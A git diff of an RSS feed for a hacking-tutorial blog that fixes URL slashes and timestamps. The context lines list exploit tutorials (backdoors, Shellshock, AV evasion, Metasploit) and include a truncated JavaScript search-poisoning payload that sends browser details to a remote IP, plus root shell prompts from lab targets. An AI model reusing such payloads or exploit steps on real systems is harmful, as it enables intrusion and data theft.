@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
-<channel><title>m3t4lk3y</title><link>https://metalkey.github.io//index.html</link>
+<channel><title>m3t4lk3y</title><link>https://metalkey.github.io/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sun, 03 Jul 2016 01:05:35 +1000</lastBuildDate>
-<pubDate>Sun, 03 Jul 2016 01:05:35 +1000</pubDate>
-<atom:link href="https://metalkey.github.io//feed.rss" rel="self" type="application/rss+xml" />
+<lastBuildDate>Sun, 03 Jul 2016 01:10:16 +1000</lastBuildDate>
+<pubDate>Sun, 03 Jul 2016 01:10:16 +1000</pubDate>
+<atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Google Chrome Search Poison – Default Search Engine Exploit
 </title><description><![CDATA[
@@ -79,9 +79,10 @@ javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.produ
 
 <p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//google-chrome-search-poison---default-search-engine-exploit.html</link>
-<guid>https://metalkey.github.io//./google-chrome-search-poison---default-search-engine-exploit.html</guid>
+]]></description><link>https://metalkey.github.io/google-chrome-search-poison---default-search-engine-exploit.html</link>
+<guid>https://metalkey.github.io/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Sat, 02 Jul 2016 20:37:36 +1000</pubDate></item>
 <item><title>
@@ -143,9 +144,10 @@ root@metasploitable:/etc/unreal#
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//unrealircd-3281-backdoor-command-execution.html</link>
-<guid>https://metalkey.github.io//./unrealircd-3281-backdoor-command-execution.html</guid>
+]]></description><link>https://metalkey.github.io/unrealircd-3281-backdoor-command-execution.html</link>
+<guid>https://metalkey.github.io/./unrealircd-3281-backdoor-command-execution.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Sat, 02 Jul 2016 19:11:59 +1000</pubDate></item>
 <item><title>
@@ -192,9 +194,10 @@ root@metasploitable:/#
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//vsftpd-v234-backdoor-command-execution.html</link>
-<guid>https://metalkey.github.io//./vsftpd-v234-backdoor-command-execution.html</guid>
+]]></description><link>https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html</link>
+<guid>https://metalkey.github.io/./vsftpd-v234-backdoor-command-execution.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Sat, 02 Jul 2016 19:05:03 +1000</pubDate></item>
 <item><title>
@@ -290,9 +293,10 @@ root
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
-<guid>https://metalkey.github.io//./linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</guid>
+]]></description><link>https://metalkey.github.io/linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
+<guid>https://metalkey.github.io/./linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Sat, 02 Jul 2016 18:52:36 +1000</pubDate></item>
 <item><title>
@@ -419,9 +423,10 @@ If your system is vulnerable, ensure it is patched immediately by upgrading your
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//shellshock-explained--exploitation-tutorial.html</link>
-<guid>https://metalkey.github.io//./shellshock-explained--exploitation-tutorial.html</guid>
+]]></description><link>https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html</link>
+<guid>https://metalkey.github.io/./shellshock-explained--exploitation-tutorial.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Sat, 02 Jul 2016 18:01:02 +1000</pubDate></item>
 <item><title>
@@ -536,9 +541,10 @@ C:\7-ZipPortable>
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//shellter---the-ultimate-tool-for-av-evasion.html</link>
-<guid>https://metalkey.github.io//./shellter---the-ultimate-tool-for-av-evasion.html</guid>
+]]></description><link>https://metalkey.github.io/shellter---the-ultimate-tool-for-av-evasion.html</link>
+<guid>https://metalkey.github.io/./shellter---the-ultimate-tool-for-av-evasion.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:27:49 +1000</pubDate></item>
 <item><title>
@@ -595,9 +601,10 @@ Higher values can also be set and detailed instructions are available at Null By
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//increasing-the-power-output-of-your-alfa-awus036h.html</link>
-<guid>https://metalkey.github.io//./increasing-the-power-output-of-your-alfa-awus036h.html</guid>
+]]></description><link>https://metalkey.github.io/increasing-the-power-output-of-your-alfa-awus036h.html</link>
+<guid>https://metalkey.github.io/./increasing-the-power-output-of-your-alfa-awus036h.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:11:09 +1000</pubDate></item>
 <item><title>
@@ -667,9 +674,10 @@ You now have shell access to the Windows XP SP3 Victim with the same access as t
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//metasploit-browser-autopwn---windows-xp-sp2.html</link>
-<guid>https://metalkey.github.io//./metasploit-browser-autopwn---windows-xp-sp2.html</guid>
+]]></description><link>https://metalkey.github.io/metasploit-browser-autopwn---windows-xp-sp2.html</link>
+<guid>https://metalkey.github.io/./metasploit-browser-autopwn---windows-xp-sp2.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:09:53 +1000</pubDate></item>
 <item><title>
@@ -741,9 +749,10 @@ Mode Size Type Last modified Name<br>
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</link>
-<guid>https://metalkey.github.io//./metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</guid>
+]]></description><link>https://metalkey.github.io/metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</link>
+<guid>https://metalkey.github.io/./metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:06:44 +1000</pubDate></item>
 <item><title>
@@ -854,9 +863,10 @@ You can also download wordlists and improve wordlists using the -w, -l and -a op
 
 
 
+
 <!-- text end -->
-]]></description><link>https://metalkey.github.io//password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</link>
-<guid>https://metalkey.github.io//./password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</guid>
+]]></description><link>https://metalkey.github.io/password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</link>
+<guid>https://metalkey.github.io/./password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:03:26 +1000</pubDate></item>
 </channel></rss>
